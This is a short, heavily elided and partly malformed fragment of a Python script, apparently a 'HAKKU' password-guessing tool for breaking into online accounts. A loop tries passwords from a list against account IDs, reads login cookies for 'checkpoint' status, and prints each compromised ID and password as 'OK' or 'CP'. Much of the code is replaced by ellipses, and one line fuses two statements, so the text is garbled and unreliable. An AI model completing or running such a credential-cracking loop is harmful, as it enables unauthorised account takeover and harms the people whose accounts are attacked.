...
def animation(u):
	...
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)def linex():
...
def passu():
	...
	prog = Progress(TextColumn('\033[1;97m [HAKKU-XD]{task.description}'))
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\u001b[33m [HAKKU-CP] {idf} │ {pw}\033[1;97m')
				...
				print(f'\033[1;32m [HAKKU-OK] {idf} │ {pw}\033[1;97m')
